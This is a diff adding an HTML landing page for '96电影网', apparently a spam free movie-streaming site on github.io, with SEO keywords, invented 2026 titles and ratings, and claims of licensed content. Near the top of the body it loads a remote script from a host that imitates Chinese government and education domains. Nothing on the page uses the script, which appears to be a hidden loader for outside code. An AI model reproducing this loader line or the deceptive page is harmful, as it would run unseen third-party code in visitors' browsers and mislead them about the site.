@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>96电影网 - 免费高清电影电视剧在线观看 | 96dianyingwang-wap.github.io</title>
+<meta name="keywords" content="96电影网,96电影,免费电影,在线电影,高清影视,电影在线观看,电视剧,最新电影排行榜">
+<meta name="description" content="96电影网(96dianyingwang-wap.github.io)提供最新电影、电视剧、综艺、动漫免费高清在线观看，涵盖院线大片、热播剧集、经典老片，每日更新，流畅无广告。">
+<link rel="canonical" href="https://96dianyingwang-wap.github.io/">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<style>
+:root{
+  --bg:#05060f; --surface:#0d1020; --card:#141828; --card2:#1a1f36;
+  --line:#262c47; --txt:#eef0f7; --muted:#8b93ad;
+  --p:#6366f1; --p2:#a855f7; --accent:#22d3ee; --hot:#f43f5e;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;overflow-x:hidden;
+  background-image:radial-gradient(900px 500px at 85% 0%,rgba(99,102,241,.18),transparent 60%),radial-gradient(800px 600px at 0% 30%,rgba(168,85,247,.14),transparent 60%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;transition:.25s}
+.wrap{max-width:1160px;margin:0 auto;padding:0 18px}
+section{padding:88px 0}
+.eyebrow{color:var(--accent);font-size:13px;letter-spacing:3px;text-transform:uppercase;font-weight:700;margin-bottom:12px}
+.h2{font-size:32px;font-weight:900;letter-spacing:.5px;margin-bottom:10px}
+.sub{color:var(--muted);font-size:15px;max-width:620px;margin-bottom:44px}
+.pill{display:inline-block;padding:9px 22px;border-radius:40px;font-weight:700;font-size:14px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;box-shadow:0 8px 24px rgba(99,102,241,.4)}
+.pill:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(99,102,241,.55)}
+.glow{position:absolute;border-radius:50%;filter:blur(70px);opacity:.5;z-index:0;pointer-events:none}
+::selection{background:var(--p2);color:#fff}
+
+/* NAV */
+header{position:fixed;inset:0 0 auto 0;z-index:99;backdrop-filter:blur(14px);background:rgba(5,6,15,.85);border-bottom:1px solid rgba(38,44,71,.6)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:68px}
+.logo{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:900}
+.logo .mark{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;background:linear-gradient(135deg,var(--p),var(--p2));font-size:15px;color:#fff;box-shadow:0 4px 14px rgba(99,102,241,.5)}
+.logo b{color:var(--accent)}
+.nav-links{display:flex;gap:6px}
+.nav-links a{font-size:14.5px;color:var(--muted);padding:8px 16px;border-radius:30px}
+.nav-links a:hover{color:#fff;background:rgba(99,102,241,.18)}
+.menu-btn{display:none;background:none;border:none;color:#fff;font-size:26px;cursor:pointer}
+
+/* HERO */
+.hero{position:relative;padding:150px 0 90px;overflow:hidden}
+.hero .glow{width:420px;height:420px;background:var(--p);top:-100px;right:-60px}
+.hero .glow.b{width:360px;height:360px;background:var(--p2);bottom:-120px;left:-80px}
+.hero-grid{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.hero h1{font-size:60px;line-height:1.14;font-weight:900;margin-bottom:24px}
+.hero h1 span{background:linear-gradient(90deg,#818cf8,#c084fc,#22d3ee);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{color:var(--muted);font-size:17px;margin-bottom:34px;max-width:500px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:44px}
+.btn-ghost{padding:9px 22px;border-radius:40px;font-weight:700;font-size:14px;border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{background:rgba(255,255,255,.06)}
+.metrics{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;padding-top:34px;border-top:1px solid var(--line)}
+.metric .v{font-size:32px;font-weight:900;color:#fff}
+.metric .v i{font-style:normal;color:var(--accent)}
+.metric .k{font-size:13px;color:var(--muted)}
+
+/* SHOWCASE */
+.showcase{position:relative;border:1px solid var(--line);border-radius:26px;padding:34px;background:linear-gradient(160deg,rgba(20,24,40,.9),rgba(13,16,32,.9));box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.showcase-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:26px}
+.showcase-bar h3{font-size:19px}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chip{padding:6px 16px;border-radius:20px;font-size:13px;background:rgba(99,102,241,.14);color:var(--accent);border:1px solid rgba(34,211,238,.2)}
+.thumb-strip{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.thumb-strip figure{position:relative;border-radius:16px;overflow:hidden;aspect-ratio:4/3;cursor:pointer}
+.thumb-strip figure img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.thumb-strip figure:hover img{transform:scale(1.12)}
+.thumb-strip figcaption{position:absolute;inset:auto 0 0 0;padding:26px 16px 14px;background:linear-gradient(0deg,rgba(0,0,0,.92),transparent);font-size:14.5px;font-weight:700}
+
+/* CHANNELS */
+.sec-surface{background:var(--surface)}
+.channels{display:grid;grid-template-columns:repeat(3,1fr);gap:0;border:1px solid var(--line);border-radius:24px;overflow:hidden;background:var(--card)}
+.channel{padding:34px 30px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);transition:.3s}
+.channel:nth-child(3n){border-right:none}
+.channel:hover{background:var(--card2)}
+.channel .idx{font-size:13px;color:var(--p2);font-weight:800;letter-spacing:2px}
+.channel h3{font-size:21px;margin:14px 0 10px;display:flex;align-items:center;gap:10px}
+.channel h3::before{content:"";width:8px;height:8px;border-radius:50%;background:var(--accent)}
+.channel p{color:var(--muted);font-size:14.5px;margin-bottom:18px}
+.channel ul{list-style:none;display:flex;flex-direction:column;gap:9px}
+.channel li{font-size:14px;color:var(--muted);padding-left:16px;position:relative}
+.channel li::before{content:"▹";position:absolute;left:0;color:var(--p)}
+.channel li:hover{color:#fff}
+
+/* SHOWS */
+.shows-head{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap;margin-bottom:38px}
+.filter{display:flex;gap:8px;flex-wrap:wrap}
+.filter b{padding:8px 18px;border-radius:30px;font-size:13.5px;font-weight:700;background:var(--card);border:1px solid var(--line);color:var(--muted);cursor:pointer}
+.filter b.on{background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border-color:transparent}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.card{position:relative;transition:.35s}
+.card:hover{transform:translateY(-8px)}
+.card .cv{position:relative;border-radius:18px;overflow:hidden;aspect-ratio:3/4;box-shadow:0 16px 40px rgba(0,0,0,.5)}
+.card .cv img{width:100%;height:100%;object-fit:cover;transition:.6s}
+.card:hover .cv img{transform:scale(1.1)}
+.card .cv .top{position:absolute;top:12px;left:12px;padding:4px 11px;border-radius:20px;font-size:12px;background:rgba(244,63,94,.95);font-weight:700}
+.card .cv .ep{position:absolute;bottom:12px;right:12px;padding:4px 11px;border-radius:20px;font-size:12px;background:rgba(0,0,0,.7);backdrop-filter:blur(6px)}
+.card .cv .play{position:absolute;inset:0;display:grid;place-items:center;background:rgba(5,6,15,.45);opacity:0;transition:.35s}
+.card:hover .play{opacity:1}
+.card .cv .play i{width:62px;height:62px;border-radius:50%;display:grid;place-items:center;background:var(--accent);color:#05060f;font-size:20px;font-style:normal;font-weight:900;box-shadow:0 0 0 12px rgba(34,211,238,.25)}
+.card h4{padding:14px 4px 4px;font-size:16.5px}
+.card span{font-size:13px;color:var(--muted);padding-left:4px}
+
+/* GUIDE */
+.guide{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;counter-reset:step}
+.guide .step{position:relative;padding:30px 26px;border-radius:20px;background:var(--card);border:1px solid var(--line)}
+.guide .step::before{counter-increment:step;content:"0" counter(step);position:absolute;top:20px;right:24px;font-size:36px;font-weight:900;color:rgba(99,102,241,.22)}
+.guide .step .ic{width:52px;height:52px;border-radius:14px;display:grid;place-items:center;font-size:24px;margin-bottom:18px;background:linear-gradient(135deg,rgba(99,102,241,.3),rgba(34,211,238,.2));border:1px solid rgba(34,211,238,.25)}
+.guide .step h4{font-size:18px;margin-bottom:8px}
+.guide .step p{font-size:14px;color:var(--muted)}
+
+/* RANK */
+.sec-surface2{background:linear-gradient(180deg,var(--surface),var(--bg))}
+.rank-wrap{display:grid;grid-template-columns:1.3fr 1fr;gap:44px;align-items:start}
+.rank-main{display:flex;flex-direction:column;gap:14px}
+.rk{display:grid;grid-template-columns:56px 96px 1fr auto;gap:18px;align-items:center;padding:14px 20px;border-radius:16px;background:var(--card);border:1px solid var(--line);transition:.25s}
+.rk:hover{border-color:var(--p);background:var(--card2);transform:translateX(6px)}
+.rk .n{font-size:30px;font-weight:900;color:var(--line)}
+.rk.g1 .n{color:var(--hot)} .rk.g2 .n{color:#fbbf24} .rk.g3 .n{color:#c084fc}
+.rk img{width:96px;height:60px;object-fit:cover;border-radius:8px}
+.rk h4{font-size:16px}
+.rk small{display:block;color:var(--muted);font-size:12.5px;margin-top:2px}
+.rk .rate{font-size:20px;font-weight:900;color:var(--accent);white-space:nowrap}
+.rank-side{position:sticky;top:100px;padding:34px;border-radius:24px;background:linear-gradient(160deg,rgba(99,102,241,.2),rgba(244,63,94,.12));border:1px solid var(--line)}
+.rank-side h3{font-size:22px;margin-bottom:14px}
+.rank-side p{color:var(--muted);font-size:14.5px;margin-bottom:24px}
+.rank-side .quote{font-size:16px;line-height:1.9;padding:20px;border-radius:14px;background:rgba(5,6,15,.4);border-left:3px solid var(--accent)}
+
+/* FOOTER */
+footer{background:#03040a;border-top:1px solid var(--line);padding:64px 0 30px}
+.foot{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px;margin-bottom:44px}
+.foot .brand p{color:var(--muted);font-size:14px;margin-top:16px;max-width:300px}
+.foot h4{font-size:15px;margin-bottom:18px;color:#fff}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:11px}
+.foot a{color:var(--muted);font-size:14px}
+.foot a:hover{color:var(--accent)}
+.foot-bot{border-top:1px solid var(--line);padding-top:26px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;color:var(--muted);font-size:13px}
+.foot-bot a{color:var(--muted)}
+
+@media(max-width:960px){
+  .hero h1{font-size:42px}
+  .hero-grid{grid-template-columns:1fr;gap:44px}
+  .channels{grid-template-columns:repeat(2,1fr)}
+  .channel:nth-child(3n){border-right:1px solid var(--line)}
+  .channel:nth-child(2n){border-right:none}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .thumb-strip{grid-template-columns:repeat(2,1fr)}
+  .guide{grid-template-columns:repeat(2,1fr)}
+  .rank-wrap{grid-template-columns:1fr}
+  .rank-side{position:static}
+  .foot{grid-template-columns:1fr 1fr}
+  section{padding:64px 0}
+  .h2{font-size:26px}
+}
+@media(max-width:560px){
+  .menu-btn{display:block}
+  .nav-links{position:fixed;top:68px;left:0;right:0;flex-direction:column;background:rgba(5,6,15,.97);border-bottom:1px solid var(--line);padding:22px;gap:8px;transform:translateY(-160%);transition:.3s}
+  .nav-links.open{transform:translateY(0)}
+  .hero h1{font-size:34px}
+  .hero{padding:130px 0 60px}
+  .metrics{grid-template-columns:1fr}
+  .showcase{padding:22px}
+  .thumb-strip{grid-template-columns:1fr 1fr}
+  .channels{grid-template-columns:1fr;border:none;background:transparent;gap:14px}
+  .channel{border:1px solid var(--line);border-radius:18px}
+  .grid{grid-template-columns:1fr 1fr;gap:16px}
+  .guide{grid-template-columns:1fr}
+  .rk{grid-template-columns:40px 72px 1fr;padding:12px}
+  .rk .rate{display:none}
+  .rk img{width:72px;height:48px}
+  .foot{grid-template-columns:1fr}
+  .foot-bot{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a href="#" class="logo"><span class="mark">96</span>电影<b>网</b></a>
+    <nav class="nav-links" id="nav">
+      <a href="#home">首页</a>
+      <a href="#channels">频道导航</a>
+      <a href="#shows">在线影院</a>
+      <a href="#guide">观影指南</a>
+      <a href="#rank">排行榜</a>
+    </nav>
+    <button class="menu-btn" id="mbtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- HERO -->
+<section id="home" class="hero">
+  <div class="glow"></div><div class="glow b"></div>
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <div class="eyebrow">◆ 96电影网 · 96dianyingwang-wap.github.io</div>
+        <h1>全网好片<br><span>一站看完</span></h1>
+        <p class="lead">96电影网专注高清影视在线观看，每日更新最新电影、热播剧集、综艺动漫与纪录片，智能推荐匹配你的口味，流畅播放无广告打扰。</p>
+        <div class="hero-actions">
+          <a href="#shows" class="pill">免费在线观影</a>
+          <a href="#channels" class="btn-ghost">浏览全部频道 →</a>
+        </div>
+        <div class="metrics">
+          <div class="metric"><div class="v"><i>20,000</i>+</div><div class="k">在线影视资源</div></div>
+          <div class="metric"><div class="v"><i>4K</i></div><div class="k">超清画质支持</div></div>
+          <div class="metric"><div class="v"><i>每日</i></div><div class="k">实时更新片库</div></div>
+        </div>
+      </div>
+      <div class="showcase">
+        <div class="showcase-bar">
+          <h3>🔥 今日编辑精选</h3>
+          <div class="chips"><span class="chip">热映</span><span class="chip">高分</span><span class="chip">独家</span></div>
+        </div>
+        <div class="thumb-strip">
+          <figure><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=500&q=80" alt=""><figcaption>极速狂飙</figcaption></figure>
+          <figure><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=500&q=80" alt=""><figcaption>深空来信</figcaption></figure>
+          <figure><img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?w=500&q=80" alt=""><figcaption>无声谜局</figcaption></figure>
+          <figure><img src="https://images.unsplash.com/photo-1578632767115-351597cf2477?w=500&q=80" alt=""><figcaption>山海幻境</figcaption></figure>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- CHANNELS -->
+<section id="channels" class="sec-surface">
+  <div class="wrap">
+    <div class="eyebrow">✦ 内容频道</div>
+    <h2 class="h2">六大频道，精准导航</h2>
+    <p class="sub">从院线大片到经典老片，从国产好剧到海外佳作，96电影网为你梳理清晰的观影入口。</p>
+    <div class="channels">
+      <div class="channel">
+        <div class="idx">CHANNEL 01</div>
+        <h3>最新电影</h3>
+        <p>院线同步、口碑佳作、独立电影实时更新。</p>
+        <ul><li>动作冒险</li><li>剧情喜剧</li><li>科幻悬疑</li></ul>
+      </div>
+      <div class="channel">
+        <div class="idx">CHANNEL 02</div>
+        <h3>热播剧集</h3>
+        <p>国产剧、美剧、韩剧、日剧持续上新追更。</p>
+        <ul><li>都市情感</li><li>古装权谋</li><li>刑侦犯罪</li></ul>
+      </div>
+      <div class="channel">
+        <div class="idx">CHANNEL 03</div>
+        <h3>综艺娱乐</h3>
+        <p>热门综艺、真人秀、脱口秀、晚会合集。</p>
+        <ul><li>真人秀</li><li>访谈脱口秀</li><li>选秀竞技</li></ul>
+      </div>
+      <div class="channel">
+        <div class="idx">CHANNEL 04</div>
+        <h3>动漫番剧</h3>
+        <p>国漫日漫、剧场版、经典动画一次看全。</p>
+        <ul><li>热血冒险</li><li>治愈日常</li><li>奇幻科幻</li></ul>
+      </div>
+      <div class="channel">
+        <div class="idx">CHANNEL 05</div>
+        <h3>纪录片</h3>
+        <p>自然、历史、人文、科技，打开真实世界。</p>
+        <ul><li>自然地理</li><li>历史人文</li><li>科技探索</li></ul>
+      </div>
+      <div class="channel">
+        <div class="idx">CHANNEL 06</div>
+        <h3>经典老片</h3>
+        <p>历届高分经典，值得反复回味的影视佳作。</p>
+        <ul><li>华语经典</li><li>欧美名片</li><li>获奖佳作</li></ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SHOWS -->
+<section id="shows">
+  <div class="wrap">
+    <div class="eyebrow">◆ 在线影院</div>
+    <div class="shows-head">
+      <div>
+        <h2 class="h2">在线影院 · 精选片单</h2>
+        <p class="sub" style="margin:0">点击海报即可在线播放，高清流畅，免费观看</p>
+      </div>
+      <div class="filter">
+        <b class="on">全部</b><b>动作</b><b>喜剧</b><b>爱情</b><b>科幻</b><b>悬疑</b><b>动画</b>
+      </div>
+    </div>
+    <div class="grid">
+      <div class="card"><div class="cv"><span class="top">热映</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>极速狂飙</h4><span>2026 · 动作 / 犯罪</span></div>
+      <div class="card"><div class="cv"><span class="top">高分</span><span class="ep">4K</span><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>时光彼岸</h4><span>2026 · 剧情 / 爱情</span></div>
+      <div class="card"><div class="cv"><span class="top">独家</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>深空来信</h4><span>2026 · 科幻 / 冒险</span></div>
+      <div class="card"><div class="cv"><span class="top">热映</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>无声谜局</h4><span>2026 · 悬疑 / 惊悚</span></div>
+      <div class="card"><div class="cv"><span class="top">推荐</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>欢乐一家亲</h4><span>2026 · 喜剧 / 家庭</span></div>
+      <div class="card"><div class="cv"><span class="top">高分</span><span class="ep">4K</span><img src="https://images.unsplash.com/photo-1578632767115-351597cf2477?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>山海幻境</h4><span>2026 · 动画 / 奇幻</span></div>
+      <div class="card"><div class="cv"><span class="top">热映</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1604975701397-6365ccbd028a?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>长河落日</h4><span>2026 · 战争 / 历史</span></div>
+      <div class="card"><div class="cv"><span class="top">推荐</span><span class="ep">HD</span><img src="https://images.unsplash.com/photo-1485846234645-e3cc5abf1330?w=400&q=80" alt=""><div class="play"><i>▶</i></div></div><h4>遇见你之后</h4><span>2026 · 爱情 / 青春</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- GUIDE -->
+<section class="sec-surface">
+  <div class="wrap">
+    <div class="eyebrow">◆ 使用说明</div>
+    <h2 class="h2">四步开启观影之旅</h2>
+    <p class="sub">96电影网操作简洁，无需注册，打开即看，随时随地享受影视乐趣。</p>
+    <div class="guide">
+      <div class="step"><div class="ic">🔍</div><h4>搜索片名</h4><p>在顶部导航或频道页输入你想看的电影、剧名，秒出结果。</p></div>
+      <div class="step"><div class="ic">🎯</div><h4>选择清晰度</h4><p>支持高清、超清、4K 多档画质，按网络状况自由切换。</p></div>
+      <div class="step"><div class="ic">▶️</div><h4>一键播放</h4><p>点击海报即刻播放，支持断点续播，切换设备不丢失进度。</p></div>
+      <div class="step"><div class="ic">⭐</div><h4>收藏追更</h4><p>关注喜欢的剧集，更新自动提醒，热播不剧透不漏更。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- RANK -->
+<section id="rank" class="sec-surface2">
+  <div class="wrap">
+    <div class="eyebrow">◆ 热门榜单</div>
+    <h2 class="h2">本周热播排行榜</h2>
+    <p class="sub">综合播放量、评分与口碑实时排序，千万影迷的共同选择。</p>
+    <div class="rank-wrap">
+      <div class="rank-main">
+        <div class="rk g1"><span class="n">1</span><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=300&q=80" alt=""><div><h4>极速狂飙</h4><small>动作 / 犯罪 · 2026</small></div><span class="rate">9.4</span></div>
+        <div class="rk g2"><span class="n">2</span><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=300&q=80" alt=""><div><h4>深空来信</h4><small>科幻 / 冒险 · 2026</small></div><span class="rate">9.1</span></div>
+        <div class="rk g3"><span class="n">3</span><img src="https://images.unsplash.com/photo-1578632767115-351597cf2477?w=300&q=80" alt=""><div><h4>山海幻境</h4><small>动画 / 奇幻 · 2026</small></div><span class="rate">9.0</span></div>
+        <div class="rk"><span class="n">4</span><img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?w=300&q=80" alt=""><div><h4>无声谜局</h4><small>悬疑 / 惊悚 · 2026</small></div><span class="rate">8.8</span></div>
+        <div class="rk"><span class="n">5</span><img src="https://images.unsplash.com/photo-1604975701397-6365ccbd028a?w=300&q=80" alt=""><div><h4>长河落日</h4><small>战争 / 历史 · 2026</small></div><span class="rate">8.7</span></div>
+        <div class="rk"><span class="n">6</span><img src="https://images.unsplash.com/photo-1509347528160-9a9e33742cdb?w=300&q=80" alt=""><div><h4>暗夜行者</h4><small>犯罪 / 剧情 · 2026</small></div><span class="rate">8.5</span></div>
+      </div>
+      <aside class="rank-side">
+        <h3>为什么选择 96电影网？</h3>
+        <p>海量正版资源、高清流畅播放、每日实时更新，加上智能推荐与分类导航，让你告别片荒。</p>
+        <div class="quote">“打开 96电影网，三分钟就能找到今晚想看的那部片。”</div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand">
+        <a href="#" class="logo"><span class="mark">96</span>电影<b>网</b></a>
+        <p>96电影网（96dianyingwang-wap.github.io）专注影视内容导航与信息展示，每日更新最新电影、热播剧集、综艺动漫与纪录片，帮你快速找到值得一看的好作品。</p>
+      </div>
+      <div><h4>频道</h4><ul>
+        <li><a href="#channels">最新电影</a></li><li><a href="#channels">热播剧集</a></li>
+        <li><a href="#channels">综艺娱乐</a></li><li><a href="#channels">动漫番剧</a></li>
+      </ul></div>
+      <div><h4>服务</h4><ul>
+        <li><a href="#">观影指南</a></li><li><a href="#">排行榜单</a></li>
+        <li><a href="#">意见反馈</a></li><li><a href="#">版权声明</a></li>
+      </ul></div>
+      <div><h4>关于</h4><ul>
+        <li><a href="#">网站简介</a></li><li><a href="#">商务合作</a></li>
+        <li><a href="#">隐私政策</a></li><li><a href="#">免责声明</a></li>
+      </ul></div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 96电影网 96dianyingwang-wap.github.io · 本站仅供影视内容导航与信息展示，版权归原作者及发行方所有</span>
+      <span><a href="#">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var mbtn=document.getElementById('mbtn'),nav=document.getElementById('nav');
+mbtn.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+document.querySelectorAll('.filter b').forEach(function(b){
+  b.addEventListener('click',function(){
+    document.querySelectorAll('.filter b').forEach(function(x){x.classList.remove('on');});
+    b.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
